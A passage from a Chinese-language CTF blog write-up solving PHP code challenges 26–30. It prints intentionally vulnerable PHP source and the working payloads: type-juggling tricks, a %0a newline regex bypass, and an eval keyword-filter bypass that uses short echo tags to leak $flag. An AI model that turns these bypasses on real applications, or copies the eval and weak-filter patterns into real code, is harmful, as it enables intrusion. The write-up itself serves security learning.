<h1 id="challenge26"><a href="#challenge26" class="headerlink" title="challenge26"></a>challenge26</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/flag.php'</span>;</span><br><span class="line"></span><br><span class="line">    $value = $_GET[<span class="string">'value'</span>];</span><br><span class="line"></span><br><span class="line">    $username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_GET[<span class="string">'username'</span>]) <span class="keyword">unset</span>($username);</span><br><span class="line">        <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) <span class="keyword">unset</span>($value);</span><br><span class="line">        <span class="keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($username == <span class="string">'15th_HackingCamp'</span> &amp;&amp; md5($password) == md5(file_get_contents(<span class="string">'./secret.passwd'</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">            <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>这里要求不能输入username，并且输入的vaule不在ascii码可见范围内但是最后又要求value经过chr后拼接的username为<code>15th_HackingCamp</code>，这里可以利用强转和弱比较<br>脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ($i &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">    $test = $i.<span class="string">"e1"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($test &gt; <span class="number">32</span> &amp;&amp; $test &lt; <span class="number">127</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ord(chr($test))&gt;<span class="number">32</span>)&amp;&amp;(ord(chr($test))&lt;<span class="number">127</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"test:"</span>.$test.<span class="string">"   chr:"</span>.chr($test).<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     $i = $i+<span class="number">0.1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1589268617202.png" alt="1589268617202"></p>
<p>之后拼接成我们想要的字符串就可以了</p>
<p>payload:</p>
<blockquote>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">value</span>[]=<span class="number">56.100000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">82.1e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">88.499999999999e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">87.299999999999e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">86.399999999999e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">84.099999999999e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">60.900000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">61.100000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">61.900000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">61.700000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">62.200000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">61.500000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">57.900000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">60.900000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">62.100000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">62.400000000001e1</span>&amp;<span class="keyword">password</span>=simple_passw0rd</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589269001817.png" alt="1589269001817"></p>
<h1 id="challenge27"><a href="#challenge27" class="headerlink" title="challenge27"></a>challenge27</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>], $_GET[<span class="string">'password'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'hard_login_check'</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Already logged in..'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]&#123;<span class="number">3</span>&#125;) || strtolower($_GET[<span class="string">'username'</span>]) != $hidden_username)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Wrong username..'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]&#123;<span class="number">7</span>&#125;) || $_GET[<span class="string">'password'</span>] != $hidden_password)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Wrong password..'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $_SESSION[<span class="string">'hard_login_check'</span>] = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Login success!'</span>;</span><br><span class="line">            header(<span class="string">'Location: ./'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>这里发现代码里面没有输出flag的地方，无论怎样都会发生跳转，于是使用抓包抓取index.php<br><img src="/2020/05/12/PHP_Code_Challenge/1589245105639.png" alt="1589245105639"></p>
<h1 id="challenge28"><a href="#challenge28" class="headerlink" title="challenge28"></a>challenge28</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/flag.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'say'</span>]) &amp;&amp; strlen($_GET[<span class="string">'say'</span>]) &lt; <span class="number">20</span>)&#123;</span><br><span class="line"></span><br><span class="line">        $say = preg_replace(<span class="string">'/^(.*)flag(.*)$/'</span>, <span class="string">'$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;'</span>, $_GET[<span class="string">'say'</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/give_me_the_flag/'</span>, $say))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'What the f**k?'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>审计代码发现正则写法为:</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^<span class="comment">(.*)</span>flag<span class="comment">(.*)</span>$/</span><br></pre></td></tr></table></figure>

<p>4.而这个写法是存在缺陷的:<code>.</code>用于任意字符匹配并不包括换行符，而且<code>^ $</code>界定了必须在同一行，否则匹配不到，也就是说，换行的话，即可破解所以payload为：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">say</span>=%0agive_me_the_flag</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1589208538876.png" alt="1589208538876"></p>
<h1 id="challenge29"><a href="#challenge29" class="headerlink" title="challenge29"></a>challenge29</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/flag.php'</span>;</span><br><span class="line"></span><br><span class="line">    $exam = <span class="string">'return\''</span>.sha1(time()).<span class="string">'\';'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;a href="./?flag='</span>.$exam.<span class="string">'"&gt;Click here&lt;/a&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'flag'</span>]) != strlen($exam)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not allowed length'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is'</span>, $_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not allowed keyword'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">eval</span>($_GET[<span class="string">'flag'</span>]) === sha1($flag)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'What\'s going on?'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>这里过滤了很多关键字</p>
<p>最后发现可以用以下方式绕过，直接输出比如</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>=$flag=<span class="string">'123'</span>;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>可以直接得到结果：123那么我们在这题中，只要构造出<code>&lt;?=$flag?&gt;</code>即可立刻输出我们要的flag，而不需要再去管sha1的相等问题那么如何构造<code>$flag</code>呢？可以用拼接的方式:</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$a</span>=<span class="string">'alag'</span>;<span class="symbol">$a</span>&#123;<span class="number">0</span>&#125;=<span class="string">'f'</span>;</span><br></pre></td></tr></table></figure>

<p>于是最后的payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=$a=<span class="string">'alag'</span>;$a&#123;<span class="number">0</span>&#125;=<span class="string">'f'</span>;<span class="number">1111111111111111</span>;<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$&#123;$a&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1589208146743.png" alt="1589208146743"></p>
<h1 id="challenge30"><a href="#challenge30" class="headerlink" title="challenge30"></a>challenge30</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/flag.php'</span>; </span><br><span class="line">$IsMatch= preg_match(<span class="string">"/hongya.*ho.*ngya.&#123;4&#125;hongya&#123;3&#125;:\/.\/(.*hongya)/i"</span>, trim($_POST[<span class="string">"id"</span>]), $match);</span><br><span class="line"><span class="keyword">if</span>( $IsMatch )&#123;  </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这一题主要就是匹配<code>hongya.*ho.*ngya.{4}hongya{3}:\/.\/(.*hongya)</code>这个正则表达式。</p>
<p>尝试构造payload:</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hongya.<span class="selector-class">.ho</span>.<span class="selector-class">.ngya</span>...<span class="selector-class">.hongyaaa</span>:/./..hongya</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1589205670232.png" alt="1589205670232"></p>

      
    </div>
    
    
    

    <div>
      
        
<div class="my_post_copyright">
  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

  <!-- JS库 sweetalert 可修改路径 -->
  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
  <span>文章作者:</span><a href="/" title="访问 CyzCc 的个人博客">CyzCc</a><br>
  <span>最后更新:</span>2020年05月12日 16:05:22<br>
  <span>原始链接:</span><a href="/2020/05/12/PHP_Code_Challenge/" title="PHP_Code_Challenge">https://cyzcc.vip/2020/05/12/PHP_Code_Challenge/</a><br>
  <span>版权声明:</span>转载请注明出处！<br>  
</div>

      
</div>
	
	

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>您的支持就是我的动力！</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>打赏</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="CyzCc Thanks"/>
        <p>Thanks</p>
      </div>
    

    

    

  </div>
</div>

      </div>
    

    
      <div>
        
          <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------　　　　本文结束　<i class="fa fa-heart"></i>　感谢您的阅读　　　　-------------</div>
    
</div>

        
      </div>


    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/PHP%E5%AD%A6%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> PHP学习</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/05/11/ctfshow36d/" rel="next" title="CTFshow36D&&网鼎杯AreUSerialz">
                <i class="fa fa-chevron-left"></i> CTFshow36D&&网鼎杯AreUSerialz
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/05/16/BUU-web5/" rel="prev" title="BUU-web五">
                BUU-web五 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
                alt="CyzCc" />
            
              <p class="site-author-name" itemprop="name">CyzCc</p>
              <p class="site-description motion-element" itemprop="description">卍~~黑玫瑰将再次绽放~~卐</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">61</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">18</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="1643277253@qq.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="http://www.heibanke.com/lesson/crawler_ex00/" target="_blank" title="爬虫闯关">
                      
                        <i class="fa fa-fw fa-globe"></i>爬虫闯关</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://adworld.xctf.org.cn/" target="_blank" title="攻防世界">
                      
                        <i class="fa fa-fw fa-globe"></i>攻防世界</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://buuoj.cn/" target="_blank" title="BUUCTF">
                      
                        <i class="fa fa-fw fa-globe"></i>BUUCTF</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://ctf.bugku.com/" target="_blank" title="BUGKU">
                      
                        <i class="fa fa-fw fa-globe"></i>BUGKU</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="http://xss-quiz.int21h.jp/" target="_blank" title="XSS-challenges">
                      
                        <i class="fa fa-fw fa-globe"></i>XSS-challenges</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://ctf.hutc.xyz/" target="_blank" title="HUCTF">
                      
                        <i class="fa fa-fw fa-globe"></i>HUCTF</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://paper.seebug.org/" target="_blank" title="Paper">
                      
                        <i class="fa fa-fw fa-globe"></i>Paper</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="http://hkyx.myhack58.com/" target="_blank" title="黑客闯关游戏">
                      
                        <i class="fa fa-fw fa-globe"></i>黑客闯关游戏</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://www.freebuf.com/" target="_blank" title="FreeBuf">
                      
                        <i class="fa fa-fw fa-globe"></i>FreeBuf</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://blog.csdn.net/" target="_blank" title="CSDN">
                      
                        <i class="fa fa-fw fa-globe"></i>CSDN</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://wiki.0-sec.org/#/dashboard" target="_blank" title="Zero Security">
                      
                        <i class="fa fa-fw fa-globe"></i>Zero Security</a>
                  </span>
                
            </div>
          

          
          

          
          

          <div id="days"></div>
<script>
function show_date_time(){
window.setTimeout("show_date_time()", 1000);
BirthDay=new Date("10/30/2019 15:13:14");
today=new Date();
timeold=(today.getTime()-BirthDay.getTime());
sectimeold=timeold/1000
secondsold=Math.floor(sectimeold);
msPerDay=24*60*60*1000
e_daysold=timeold/msPerDay
daysold=Math.floor(e_daysold);
e_hrsold=(e_daysold-daysold)*24;
hrsold=setzero(Math.floor(e_hrsold));
e_minsold=(e_hrsold-hrsold)*60;
minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
seconds=setzero(Math.floor((e_minsold-minsold)*60));
document.getElementById('days').innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒";
}
function setzero(i){
if (i<10)
{i="0" + i};
return i;
}
show_date_time();
</script>

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-Code-Challenge"><span class="nav-number">1.</span> <span class="nav-text">PHP_Code_Challenge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge1"><span class="nav-number">2.</span> <span class="nav-text">challenge1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge2"><span class="nav-number">3.</span> <span class="nav-text">challenge2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge3"><span class="nav-number">4.</span> <span class="nav-text">challenge3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge4"><span class="nav-number">5.</span> <span class="nav-text">challenge4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge5"><span class="nav-number">6.</span> <span class="nav-text">challenge5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge6"><span class="nav-number">7.</span> <span class="nav-text">challenge6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge7"><span class="nav-number">8.</span> <span class="nav-text">challenge7</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge8"><span class="nav-number">9.</span> <span class="nav-text">challenge8</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge9"><span class="nav-number">10.</span> <span class="nav-text">challenge9</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge10"><span class="nav-number">11.</span> <span class="nav-text">challenge10</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge11"><span class="nav-number">12.</span> <span class="nav-text">challenge11</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge12"><span class="nav-number">13.</span> <span class="nav-text">challenge12</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge13"><span class="nav-number">14.</span> <span class="nav-text">challenge13</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge14"><span class="nav-number">15.</span> <span class="nav-text">challenge14</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge15"><span class="nav-number">16.</span> <span class="nav-text">challenge15</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge16"><span class="nav-number">17.</span> <span class="nav-text">challenge16</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge17"><span class="nav-number">18.</span> <span class="nav-text">challenge17</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge18"><span class="nav-number">19.</span> <span class="nav-text">challenge18</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge19"><span class="nav-number">20.</span> <span class="nav-text">challenge19</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge20"><span class="nav-number">21.</span> <span class="nav-text">challenge20</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge21"><span class="nav-number">22.</span> <span class="nav-text">challenge21</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge22"><span class="nav-number">23.</span> <span class="nav-text">challenge22</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge23"><span class="nav-number">24.</span> <span class="nav-text">challenge23</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge24"><span class="nav-number">25.</span> <span class="nav-text">challenge24</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge25"><span class="nav-number">26.</span> <span class="nav-text">challenge25</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge26"><span class="nav-number">27.</span> <span class="nav-text">challenge26</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge27"><span class="nav-number">28.</span> <span class="nav-text">challenge27</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge28"><span class="nav-number">29.</span> <span class="nav-text">challenge28</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge29"><span class="nav-number">30.</span> <span class="nav-text">challenge29</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#challenge30"><span class="nav-number">31.</span> <span class="nav-text">challenge30</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">cyzCc</span>

 <!-- 
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">161.3k</span>
  

</div>

-->






<!-- 新增访客统计代码 -->
<!--<div class="busuanzi-count">
    <script async="" src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="site-uv">
      <i class="fa fa-user"></i>
      访问用户： <span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 人
    </span>
    <div class="powered-by"></div>
    <span class="site-uv">
      <i class="fa fa-eye"></i>
      访问次数： <span class="busuanzi-value" id="busuanzi_value_site_pv"></span> 次
    </span>
    <!-- 博客字数统计 -->
    <span class="site-pv">
      <i class="fa fa-pencil"></i>
      博客全站共： <span class="post-count">161.3k</span> 字
    </span>
	  <a href="http://www.beian.miit.gov.cn" target="_blank" rel="noopener">蜀ICP备20017267号</a>
</div>
<!-- 新增访客统计代码 END-->

        
<div class="busuanzi-count">
